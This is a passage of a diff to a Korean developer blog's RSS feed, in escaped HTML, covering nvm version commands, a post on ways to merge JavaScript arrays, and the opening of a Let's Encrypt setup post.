+        alt=&quot;img 01&quot;
+        title=&quot;img 01&quot;
+        src=&quot;/static/aa2c359d5f9a45fe9686c0cd3ed00251/2a985/img_01.png&quot;
+        srcset=&quot;/static/aa2c359d5f9a45fe9686c0cd3ed00251/2a985/img_01.png 277w&quot;
+        sizes=&quot;(max-width: 277px) 100vw, 277px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;위와 같이 뜨면 잘 설치된 것이다.&lt;/p&gt;
+&lt;h2 id=&quot;유용한-명령어들&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%9C%A0%EC%9A%A9%ED%95%9C-%EB%AA%85%EB%A0%B9%EC%96%B4%EB%93%A4&quot; aria-label=&quot;유용한 명령어들 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;유용한 명령어들&lt;/h2&gt;
+&lt;h3 id=&quot;최신-버전의-node-설치&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B5%9C%EC%8B%A0-%EB%B2%84%EC%A0%84%EC%9D%98-node-%EC%84%A4%EC%B9%98&quot; aria-label=&quot;최신 버전의 node 설치 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;최신 버전의 node 설치&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;nvm install node&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;최신-버전의-lts-설치&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B5%9C%EC%8B%A0-%EB%B2%84%EC%A0%84%EC%9D%98-lts-%EC%84%A4%EC%B9%98&quot; aria-label=&quot;최신 버전의 lts 설치 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;최신 버전의 LTS 설치&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;nvm install —lts&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;특정-버전-설치&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%ED%8A%B9%EC%A0%95-%EB%B2%84%EC%A0%84-%EC%84%A4%EC%B9%98&quot; aria-label=&quot;특정 버전 설치 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;특정 버전 설치&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;nvm install 14.15.0&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;설치된-버전-확인하기&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%84%A4%EC%B9%98%EB%90%9C-%EB%B2%84%EC%A0%84-%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0&quot; aria-label=&quot;설치된 버전 확인하기 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;설치된 버전 확인하기&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;nvm ls&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;설치된-특정-버전-사용하기&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%84%A4%EC%B9%98%EB%90%9C-%ED%8A%B9%EC%A0%95-%EB%B2%84%EC%A0%84-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0&quot; aria-label=&quot;설치된 특정 버전 사용하기 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;설치된 특정 버전 사용하기&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;nvm use 14.15.0&lt;/p&gt;
+&lt;/blockquote&gt;</content:encoded></item><item><title><![CDATA[(Javascript) 배열 합치기]]></title><description><![CDATA[배열 합치기(?) 프로젝트를 진행하다가 배열을 좀 다룰 일이 있어서 찾아봤다. 그냥 안써두면 까먹을거 같아서 기록해둔다.
+방법은 여러가지가 있는데 하나씩 적어둔다 1. concat 함수 이용 …연산자 (Spread Operator)를 활용 Push…]]></description><link>https://elfinlas.github.io/js_ts/221027_array_combine/</link><guid isPermaLink="false">https://elfinlas.github.io/js_ts/221027_array_combine/</guid><pubDate>Thu, 27 Oct 2022 15:10:42 GMT</pubDate><content:encoded>&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAADs0lEQVQ4yz2SWVDUBRzH/9ywcqgrEKfA7gLCIueCHIsQroAccSwu1yIoSwsOLAJyiHK1uHEFKogBU0rAAIpFqFQ2NoF0acxIxTjTTDPVW9Y000MP9fBp66GH7/y+L9/PfGd+XyEqR0xk4V5i01yJTjlAxMuuRKlckcY4Ea/yITldhvyYE9qWWEZna+iZrObe1hU2n04xt3SJxm49+bpajmk0eEp8ENq7T9I/VkVVQwKvGpLJzotGr1Mxea2Nrz+/w/3VHq6O6+noNVBZU0W+Ro1pyMTE2GUuXGqloFqPIlPJfm8X7ETWCKWFRxi+fJbby108217jt19+ZOerByzOjbM4P8nswgCG83pyS4pJykwju7yEU3V6Kg3NtHe2MDrWz6OPlzD1NROmCEVQyPegjHVnamaYoYlhVu8vs3xriKbqbC6dq0BdUsTRTBVH05KpNkOO56Wg0eVy9cYA3z1Z569fd/n7j5/488Uu49d7EVSpwRhHBhl96220hgYyStRoa6to7mhAozlBWIgvcQkRyBU+qMpCyNT6otUlMT3awM7GAs+27vLDzkN+//kpjz+aR8guyuaiyUi7sQfNmVK09Xrqui7SZDKhb2uholHNK3VxKPI8kMbbI410JiBYRJM+ni/uXWF3Y44X32/w/LNF1mZ7EFxfcuBwbAh52mIKT5eSXpRFsRl8+lw1moYk4tViJEl2eIfb4xNqvkG2+IbYoas5zMbqADsfXmN7fYKt90ZYmTqPkFNeiq6tlTNN9WSpM1AkyskoiERZ6Elwsj3+cSK8Qm3xCrRBEmGDMsuJnPwAhnsrebDQx+PVUZ6s3+DbT9/h5lgDQrmhkawyDarCHCLi5PgHOhF9Yi/SRBEe5iZuUmsOeFvjZ/aScBuCo21ISfPE2FLC/GQHm2tj7DycYPPdNzAa0s1Pyc8gNjUepXkSXr6OiD1EBCc6Izlii6e5mbvMCnc/aw7K7JBH7yEqZj+1lRm81qZl4c0uth9N8fzLu9y5bmC0U40QnRSDQqlAIhXj4CBg52KBt9wGsb8V4gALxActcPOyQiITcTxNhq5CSV9rCcOd5dye6eaDpdd5/1Yv/c25fPPJLII8Rk5giA+OTpYIghnoLOB1yBpZmAs+gQ64eVoRIBUhO+SIKjWQC2cLGOyqMQPLmBnUMz1Sz6miJLzdHMlMkSMEhQfiss/hP9i/srQTcPa0JChyH5EKPxKVYWaFEBcXgO5kPMPd1azcNLE+Z2RluoOlqXZSE4L+z/8D5ykYwByoeqkAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;thumbnail&quot;
+        title=&quot;thumbnail&quot;
+        src=&quot;/static/aeef89ddd1212295dbd361c69dedb9bd/5a190/221027_array_combine.png&quot;
+        srcset=&quot;/static/aeef89ddd1212295dbd361c69dedb9bd/5a46d/221027_array_combine.png 300w,
+/static/aeef89ddd1212295dbd361c69dedb9bd/0a47e/221027_array_combine.png 600w,
+/static/aeef89ddd1212295dbd361c69dedb9bd/5a190/221027_array_combine.png 800w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&quot;배열-합치기&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%B0%B0%EC%97%B4-%ED%95%A9%EC%B9%98%EA%B8%B0&quot; aria-label=&quot;배열 합치기 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;배열 합치기(?)&lt;/h1&gt;
+&lt;p&gt;프로젝트를 진행하다가 배열을 좀 다룰 일이 있어서 찾아봤다.&lt;br&gt;
+그냥 안써두면 까먹을거 같아서 기록해둔다.
+방법은 여러가지가 있는데 하나씩 적어둔다&lt;/p&gt;
+&lt;h2 id=&quot;1-concat-함수-이용&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#1-concat-%ED%95%A8%EC%88%98-%EC%9D%B4%EC%9A%A9&quot; aria-label=&quot;1 concat 함수 이용 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;1. concat 함수 이용&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; tmpArr1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;value1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;value2&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;value3&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; tmpArr2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;22&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;333&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; tmpArr1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;tmpArr2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;//두 개 이상을 전달할 수 있다&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;//const result = tmpArr1.concat(tmpArr2, [&quot;tmp1&quot;,&quot;tmp2&quot;]);&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;//이 방법도 가능하다&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;//const result = [].concat(tmpArr1, tmpArr2);&lt;/span&gt;
+
+console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2 id=&quot;연산자-spread-operator를-활용&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%97%B0%EC%82%B0%EC%9E%90-spread-operator%EB%A5%BC-%ED%99%9C%EC%9A%A9&quot; aria-label=&quot;연산자 spread operator를 활용 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;…연산자 (Spread Operator)를 활용&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; tmpArr1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;value1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;value2&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;value3&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; tmpArr2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;22&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;333&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;tmpArr1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;tmpArr2&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2 id=&quot;push-함수-활용-with-연산자&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#push-%ED%95%A8%EC%88%98-%ED%99%9C%EC%9A%A9-with-%EC%97%B0%EC%82%B0%EC%9E%90&quot; aria-label=&quot;push 함수 활용 with 연산자 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Push 함수 활용 (with …연산자)&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; tmpArr1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;value1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;value2&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;value3&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; tmpArr2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;22&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;333&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;//빈 배열 선언&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+result&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;tmpArr1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+result&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;tmpArr2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;단 여기서 …연산자를 뺄 경우 배열 자체가 추가가 된다.&lt;br&gt;
+즉 결과물이 아래와 같이 나오게 된다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;//with ...oper
+[&apos;value1&apos;, &apos;value2&apos;, &apos;value3&apos;,&apos;1&apos;, &apos;22&apos;, &apos;333&apos;]
+
+//without ...oper
+[[&apos;value1&apos;, &apos;value2&apos;, &apos;value3&apos;], [&apos;1&apos;, &apos;22&apos;, &apos;333&apos;]]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Lets Encrypt 적용하기]]></title><description><![CDATA[이번에 서비스를 개발하고 오픈하면서… 예전에 LetsEncrypt…]]></description><link>https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt/</link><guid isPermaLink="false">https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt/</guid><pubDate>Fri, 23 Sep 2022 15:10:22 GMT</pubDate><content:encoded>&lt;h1 id=&quot;이번에-서비스를-개발하고-오픈하면서&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%9D%B4%EB%B2%88%EC%97%90-%EC%84%9C%EB%B9%84%EC%8A%A4%EB%A5%BC-%EA%B0%9C%EB%B0%9C%ED%95%98%EA%B3%A0-%EC%98%A4%ED%94%88%ED%95%98%EB%A9%B4%EC%84%9C&quot; aria-label=&quot;이번에 서비스를 개발하고 오픈하면서 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;이번에 서비스를 개발하고 오픈하면서…&lt;/h1&gt;
 &lt;p&gt;예전에 LetsEncrypt를 적용해봤던 적은 있었다.&lt;br&gt;
 하지만 방법이 너무 오래되었고, 와일드카드 방식으로 도메인을 사용해서 인증 방법을 다시 찾아보았다.&lt;/p&gt;
 &lt;p&gt;그 전에 앞서 먼저 내가 사용했었던 두 가지 방식을 간단하게 정리하고 넘어가겠다.&lt;/p&gt;
